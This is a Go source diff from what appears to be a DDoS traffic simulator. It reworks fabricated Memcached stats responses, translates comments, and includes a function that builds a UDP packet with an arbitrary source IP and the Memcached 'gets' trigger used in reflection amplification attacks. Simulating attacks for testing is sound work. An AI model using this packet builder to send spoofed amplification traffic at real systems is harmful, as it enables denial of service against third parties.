@@ -3,17 +3,16 @@ package protocol
 import (
 	"bytes"
 	"fmt"
-	"strings"
 )
 
-// MEMCACHEDResponseBuffer 生成Memcached协议响应
-// 放大倍数：高达51,000倍
-// 返回多个响应包以便循环发送，模拟真实攻击行为
+// MEMCACHEDResponseBuffer generates Memcached protocol responses
+// Amplification factor: up to 51,000x
+// Returns multiple response packets for cyclic sending to simulate real attack behavior
 func MEMCACHEDResponseBuffer() [][]byte {
-	// 创建多个响应包
-	responses := make([][]byte, 0, 20)
+	// Create response packets - typically only 2-3 packets in real scenarios
+	responses := make([][]byte, 0, 5)
 	
-	// 基本服务器信息包
+	// Basic server info packet - this part is relatively realistic
 	basicStats := new(bytes.Buffer)
 	addMemcachedStat(basicStats, "pid", "12345")
 	addMemcachedStat(basicStats, "uptime", "8541236")
@@ -28,7 +27,7 @@ func MEMCACHEDResponseBuffer() [][]byte {
 	basicStats.WriteString("END\r\n")
 	responses = append(responses, basicStats.Bytes())
 	
-	// 命令统计包
+	// Command statistics packet - this part is also relatively realistic
 	cmdStats := new(bytes.Buffer)
 	addMemcachedStat(cmdStats, "cmd_get", "157681241")
 	addMemcachedStat(cmdStats, "cmd_set", "18745")
@@ -51,7 +50,7 @@ func MEMCACHEDResponseBuffer() [][]byte {
 	cmdStats.WriteString("END\r\n")
 	responses = append(responses, cmdStats.Bytes())
 	
-	// 内存统计包
+	// Memory statistics packet - this part is also relatively realistic
 	memStats := new(bytes.Buffer)
 	addMemcachedStat(memStats, "bytes", "8947355144")
 	addMemcachedStat(memStats, "bytes_read", "6700631397895")
@@ -64,84 +63,55 @@ func MEMCACHEDResponseBuffer() [][]byte {
 	memStats.WriteString("END\r\n")
 	responses = append(responses, memStats.Bytes())
 	
-	// 添加多个自定义统计包，每个包都很大
-	for i := 0; i < 5; i++ {
-		customStats := new(bytes.Buffer)
-		// 每个包添加几个非常长的值
-		for j := 0; j < 4; j++ {
-			key := fmt.Sprintf("custom_stat_pkg%d_%d", i, j)
-			// 为每个自定义统计创建一个长值 (~50KB)
-			value := strings.Repeat(fmt.Sprintf("long_value_%d_%d_", i, j), 5000)
-			addMemcachedStat(customStats, key, value)
-		}
-		customStats.WriteString("END\r\n")
-		responses = append(responses, customStats.Bytes())
-	}
+	// Add a custom statistics packet for more realistic size
+	customStats := new(bytes.Buffer)
+	// Custom statistics are usually numbers or short strings
+	addMemcachedStat(customStats, "custom_stat_last_reset", "1633458712")
+	addMemcachedStat(customStats, "custom_stat_cache_hit_ratio", "99.48")
+	// Some values might be slightly longer, but not too long
+	addMemcachedStat(customStats, "custom_stat_config", "max_memory=64G;threads=4;lru_crawler=yes;maxconns=1024")
+	// A few values might be relatively long
+	addMemcachedStat(customStats, "custom_monitoring_info", "node=cache-01;cluster=us-west;dc=portland;env=prod;owner=dbteam")
+	customStats.WriteString("END\r\n")
+	responses = append(responses, customStats.Bytes())
 	
-	// 添加多个slab统计包
-	slabsPerPacket := 6
-	for pkgIdx := 0; pkgIdx < 7; pkgIdx++ {
-		slabStats := new(bytes.Buffer)
-		startSlab := 1 + pkgIdx*slabsPerPacket
-		endSlab := startSlab + slabsPerPacket
-		if endSlab > 42 {
-			endSlab = 42
-		}
+	// Add a more realistic slab statistics packet
+	slabStats := new(bytes.Buffer)
+	// Real servers typically have around 8-12 slab classes
+	for slabClass := 1; slabClass <= 8; slabClass++ {
+		prefix := fmt.Sprintf("slab_%d", slabClass)
 		
-		for slabClass := startSlab; slabClass <= endSlab; slabClass++ {
-			prefix := fmt.Sprintf("slab_%d", slabClass)
-			
-			addMemcachedStat(slabStats, prefix+"_chunk_size", fmt.Sprintf("%d", 96*slabClass))
-			addMemcachedStat(slabStats, prefix+"_chunks_per_page", fmt.Sprintf("%d", 10240/slabClass))
-			addMemcachedStat(slabStats, prefix+"_total_pages", fmt.Sprintf("%d", slabClass*10))
-			addMemcachedStat(slabStats, prefix+"_total_chunks", fmt.Sprintf("%d", slabClass*100))
-			addMemcachedStat(slabStats, prefix+"_used_chunks", fmt.Sprintf("%d", slabClass*50))
-			addMemcachedStat(slabStats, prefix+"_free_chunks", fmt.Sprintf("%d", slabClass*50))
-			addMemcachedStat(slabStats, prefix+"_free_chunks_end", fmt.Sprintf("%d", slabClass*25))
-			addMemcachedStat(slabStats, prefix+"_mem_requested", fmt.Sprintf("%d", slabClass*1000000))
-			
-			// 添加一些额外的slab特定统计以增加响应大小
-			for j := 0; j < 5; j++ {
-				subKey := fmt.Sprintf("_custom_metric_%d", j)
-				value := strings.Repeat(fmt.Sprintf("slab%d_value_%d_", slabClass, j), 100)
-				addMemcachedStat(slabStats, prefix+subKey, value)
-			}
+		// Standard slab statistics - these are numeric values
+		addMemcachedStat(slabStats, prefix+"_chunk_size", fmt.Sprintf("%d", 96*slabClass))
+		addMemcachedStat(slabStats, prefix+"_chunks_per_page", fmt.Sprintf("%d", 10240/slabClass))
+		addMemcachedStat(slabStats, prefix+"_total_pages", fmt.Sprintf("%d", slabClass*5))
+		addMemcachedStat(slabStats, prefix+"_total_chunks", fmt.Sprintf("%d", slabClass*50))
+		addMemcachedStat(slabStats, prefix+"_used_chunks", fmt.Sprintf("%d", slabClass*30))
+		addMemcachedStat(slabStats, prefix+"_free_chunks", fmt.Sprintf("%d", slabClass*20))
+		addMemcachedStat(slabStats, prefix+"_free_chunks_end", fmt.Sprintf("%d", slabClass*10))
+		addMemcachedStat(slabStats, prefix+"_mem_requested", fmt.Sprintf("%d", slabClass*500000))
+		
+		// Possible 1-2 custom metrics
+		if slabClass < 4 {
+			addMemcachedStat(slabStats, prefix+"_hit_ratio", fmt.Sprintf("%.2f", 75.5+float64(slabClass*5)))
 		}
-		slabStats.WriteString("END\r\n")
-		responses = append(responses, slabStats.Bytes())
 	}
-	
-	// 添加一些大项目数据包
-	for i := 0; i < 5; i++ {
-		itemsData := new(bytes.Buffer)
-		// 每个包包含2个大项目
-		for j := i*2; j < (i+1)*2; j++ {
-			key := fmt.Sprintf("bigitem_%d", j)
-			flags := "0"
-			// 创建一个大数据块 (~50KB)
-			dataBlock := strings.Repeat(fmt.Sprintf("BIGDATA_%d_", j), 5000)
-			
-			valueCmd := fmt.Sprintf("VALUE %s %s %d\r\n%s\r\n", 
-				key, flags, len(dataBlock), dataBlock)
-			itemsData.WriteString(valueCmd)
-		}
-		itemsData.WriteString("END\r\n")
-		responses = append(responses, itemsData.Bytes())
-	}
+	slabStats.WriteString("END\r\n")
+	responses = append(responses, slabStats.Bytes())
 	
 	return responses
 }
 
-// addMemcachedStat 添加单个Memcached统计行
+// addMemcachedStat adds a single Memcached statistic line
 func addMemcachedStat(buf *bytes.Buffer, name, value string) {
 	statLine := fmt.Sprintf("STAT %s %s\r\n", name, value)
 	buf.WriteString(statLine)
 }
 
 func MEMCACHEDPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
-    payload := append(
+	payload := append(
 		[]byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00}, 
-		[]byte("gets p h e\n")...,                            // Memcached "gets" 命令
+		[]byte("gets p h e\n")...,                            // Memcached "gets" command
 	)
-    return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
+	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
 }
